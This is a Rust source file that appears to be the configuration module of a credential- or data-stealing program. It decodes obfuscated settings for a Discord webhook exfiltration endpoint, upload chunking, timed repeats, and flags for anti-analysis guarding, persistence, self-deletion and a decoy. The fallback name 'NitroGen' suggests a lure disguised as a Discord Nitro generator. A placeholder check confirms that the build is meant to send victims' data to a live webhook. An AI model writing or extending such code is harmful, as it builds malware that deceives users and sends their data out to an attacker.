use crate::obf;

#[derive(Clone)]
pub struct Config {
    pub webhook: String,
    pub app_name: String,
    pub delay_minutes: u64,
    pub retry_minutes: u64,
    pub repeat_hours: u64,
    pub max_upload_mb: u64,
    pub chunk_mb: u64,
    pub guard: bool,
    pub persist: bool,
    pub self_delete: bool,
    pub decoy: bool,
}

impl Config {
    pub fn load() -> Self {
        Config {
            webhook: obf::s(obf::WEBHOOK),
            app_name: {
                let name = obf::s(obf::APP_NAME);
                if name.is_empty() {
                    String::from("NitroGen")
                } else {
                    name
                }
            },
            delay_minutes: obf::num(obf::DELAY_MINUTES),
            retry_minutes: obf::num(obf::RETRY_MINUTES),
            repeat_hours: obf::num(obf::REPEAT_HOURS),
            max_upload_mb: obf::num(obf::MAX_UPLOAD_MB).max(1),
            chunk_mb: obf::num(obf::CHUNK_MB).clamp(1, 8),
            guard: obf::flag(obf::GUARD),
            persist: obf::flag(obf::PERSIST),
            self_delete: obf::flag(obf::SELF_DELETE),
            decoy: obf::flag(obf::DECOY),
        }
    }

    /// A webhook that is present and not the build-time placeholder.
    pub fn webhook_ok(&self) -> bool {
        self.webhook.contains("discord.com/api/webhooks/")
            && !self.webhook.contains("REPLACE")
            && self.webhook.len() > 60
    }
}
